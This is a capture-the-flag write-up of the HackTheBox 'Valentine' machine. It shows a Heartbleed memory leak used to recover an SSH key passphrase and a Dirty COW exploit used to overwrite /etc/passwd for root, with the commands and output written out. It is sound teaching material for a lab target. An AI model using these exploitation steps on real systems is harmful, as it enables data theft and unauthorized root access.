---
layout: post
title: 'HackTheBox - Valentine'
date: 2018-09-22
author: Casey Mullineaux
cover: '/images/htb/valentine/valentine.png'
tags: hackthebox
---
This challenge sees a user shell obtained by exfiltrating sensitive information via a vulnerability called [**Heartbleed**](#heartbleed) in the OpenSSL cryptography library; which is a widely used implementation of the Transport Layer Security (TLS) protocol.

![heartbleed](/images/htb/valentine/heartbleed.png)

From there, I was able to overwrite a read-only file (`/etc/passwd`) and grant myself root user privileges by exploiting a Linux kernel race condition vulnerability called [**Dirty COW**.](#dirtycow)
# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)


# <a name="enum"></a> Enumeration
Start with a nmap scan which reveals ports 22, 80 and 443.
```bash
root@kali:~/htb/valentine# nmap -sC -sV -oA valentine 10.10.10.79 

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-25 17:17 AEDT
Nmap scan report for 10.10.10.79
Host is up (0.32s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-02-25T06:18:32+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.24 seconds
```

Browseing to the website on port 80 displays this image. 
![htb-valantine-01](/images/htb/valentine/htb-valantine-01.png)

Since we have a web server, I run a `dirbuster` scan looking for additional web directories.
![htb-valantine-02](/images/htb/valentine/htb-valantine-02.png)

I browse to `/dev` and find two files.
![htb-valantine-03](/images/htb/valentine/htb-valantine-03.png)

The contents of `notes.txt` are
> To do:
> 
> 1) Coffee.
> 2) Research.
> 3) Fix decoder/encoder before going live.
> 4) Make sure encoding/decoding is only done client-side.
> 5) Don't use the decoder/encoder until any of this is done.
> 6) Find a better way to take notes.
 
Steps 3, 4 and 5 make reference to the other two directories that were discovered (`/encode` and `/decode`), but more importantly, indicate that they may be broken/vulnerable.
# <a name="exploit"></a> Exploitation
I check out `hype_key` which looks to be a file that has been hex encoded.
![htb-valantine-04](/images/htb/valentine/htb-valantine-04.png)

Using an [online hex decoder](http://www.convertstring.com/EncodeDecode/HexDecode), I convert the hex string to ascii to reveal an encrypted RSA private key. I save it on my Kali machine as `hype_key_encrypted.key`
![htb-valantine-05](/images/htb/valentine/htb-valantine-05.png)

<p class="success">
    Secret found! <i>Encrypted RSA private key</i>
</p>

---

Next, I search for `python heartbleed GitHub` and find an [exploitation script](https://gist.github.com/eelsivart/10174134) as the very first result. I read the script and it looks like it'll job, so I download it to my kali machine.

I run the script with the defaults.
```bash
root@vmw-kali:~/htb/valantine# python heartbleed.py 10.10.10.79
                                                            
defribulator v1.16                        
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0 
Received Server Hello for TLSv1.0                                        
           
WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################
                                                                         
.@....SC[...r....+..H...9...
....w.3....f...                                                  
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........                                                              
...................................#q
```
Nothing interesting there. I run it a few more times with similar results. 

The way this script works is that it is returning a maximum of 4000 bytes of memory directly adjacent to the SSL request. The problem is, that part of the memory doesn't *always* hold useful information. If I run the script a few more times consecutively, hopefully there will be some interesting data within bytes returned.

I look at the help for the script and notice it has a loop (`-n`) parameter. 
```bash
root@vmw-kali:~/htb/valantine# python heartbleed.py -h
Usage: heartbleed.py server [options]

Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
  -f FILEIN, --filein=FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or hostname:port
  -v, --verbose         Enable verbose output
  -x, --hexdump         Enable hex output
  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
                        Dump the raw memory contents to a file
  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
                        Dump the ascii contents to a file
  -d, --donotdisplay    Do not display returned data on screen
  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
                        found. Choosing this enables -d, do not display
                        returned data on screen.
```

I set it to loop 100 times. Still nothing. I set it to loop 500 times and add the `-a` parameter to output to a file, so I can let it run and parse it later.
```bash
root@vmw-kali:~/htb/valantine# python heartbleed.py -a hbdump.txt -n 1000 10.10.10.79
```

The results, reveal a base64 encoded string assigned to a `$text` variable.
![htb-valantine-06](/images/htb/valentine/htb-valantine-06.png)

I decode the string.
```bash
root@vmw-kali:~/htb/valantine# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
heartbleedbelievethehype
```

<p class="success">
    Secret found! <i>heartbleedbelievethehype</i>
</p>

I use the secret to decrypt the private key obtained earlier.
![htb-valantine-07](/images/htb/valentine/htb-valantine-07.png)

Using the name of the encrypted key that I downloaded (`hype_key`) as a clue, I made an educated guess on the username, and try to SSH to Valentine as the user `hype` with the decrypted RSA key.
![htb-valantine-08](/images/htb/valentine/htb-valantine-08.png)

<p class="success">
    User flag obtained!
</p>

# <a name="privesc"></a> Privilege escalation

I take a look at what Linux version Valentine is running, and notice that it's very old.
```bash
hype@Valentine:~$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
This release is vulnerable to the [dirty cow](https://en.wikipedia.org/wiki/Dirty_COW) exploit.

After reading through the code and instructions, I copy/paste exploitation code from [this github](https://github.com/FireFart/dirtycow/blob/master/dirty.c) and save to Valentine as `/dev/shm/dirtycow.c`. 

This exploit code uses the dirty cow exploit to overwrite a line to the read-only `/etc/passwd/` file. In my case, I want to overwrite the details of the `hype` user to set the password and grant it root privileges.

First, I edit the user information section of the script.
![htb-valantine-09](/images/htb/valentine/htb-valantine-09.png)

Next, I compile the code
```bash
hype@valentine:~$ gcc -pthread /dev/shm/dirtycow.c -o /dev/shm/dirty -lcrypt
```

And finally, fire off the exploit.
```bash
hype@Valentine:~$ /dev/shm/dirty asuperstrongpassword
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: asuperstrongpassword
Complete line:
hype:fiXD0gs9vuSuY:0:0:the privileges of this user are totally not root:/root:/bin/bash

mmap: 7fd7e62b5000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'hype' and the password 'asuperstrongpassword'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'hype' and the password 'asuperstrongpassword'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
hype@Valentine:~$ 
```

Once the script had completed, I check the contents of `/etc/passwd` to confirm it worked correctly.
![htb-valantine-10](/images/htb/valentine/htb-valantine-10.png)

I log out, and SSH back in. This time it prompts for a password. 
![htb-valantine-11](/images/htb/valentine/htb-valantine-11.png)

I enter the password I set with DirtyCow, and I'm back in. However this time, with root privilege. 
```bash
hype@Valentine:/home/hype# cd /root
hype@Valentine:~# ls -l
total 8
-rwxr-xr-x 1 hype root 388 Dec 13  2017 curl.sh
-rw-r--r-- 1 hype root  33 Dec 13  2017 root.txt
hype@Valentine:~# cat root.txt 
[REDACTED]
```
# <a name="deconstruct"></a>Deconstructing the hack
## <a name="heartbleed"></a>Heartbleed
Sometimes, the easiest way to explain a concept is with pictures. Take a look at the [xkcd comic](https://xkcd.com/1354/) below which depicts how the techniques I used above was able to exploit the Heartbleed vulnerability and retrieve sensitive information from the remote system.

![heartbleed_explanation](/images/htb/valentine/heartbleed_explanation.png)

Firstly, the user Meg asks the server to indicate if it is still online by asking for it to reply with the word "POTATO", and she specifies the length of the word. This is what happens under the hood with a typical unmodified user request. The server responds exactly as asked. 6 letters and the word "POTATO". Notice that only the highlighted section was returned, and all surrounding data in memory is not.

Meg tries again. She asks again for the server to indicate if it is still online by responding with the word "BIRD" in four letters. The server complies.

Next, Meg asks for the word "HAT", however, specifies the response should be 500 letters in length. The server then responds not only with the word "HAT" but also by leaking out an additional 497 characters surrounding the word. 

Since memory is volatile, it doesn't *always* contain sensitive information, however in this challenge I sent a request to the server and asked it to respond with 4000 bytes of information. Lucky for me, I was able to capture a base64 hashed password that ultimately led to a user shell on the box.

## <a name="dirtycow"></a>Dirty COW

**Dirty COW** or Dirty copy-on-write is a vulnerability for the Linux kernel that affects all Linux based operating systems including Android. It is a bug that exploits a race condition in the implementation of the copy-on-write mechanism in the kernel's memory management subsystem. With the right timing, an attacker can exploit the copy-on-write mechanism to turn a read-only mapping of a file into a writeable mapping, and therefore modify or overwrite its contents.
[Wikipedia](https://en.wikipedia.org/wiki/Dirty_COW)

In this challenge, I usied the DirtyCOW vulnerability to overwrite the `/etc/passwd` file on the remote system and grant my user account root privileges.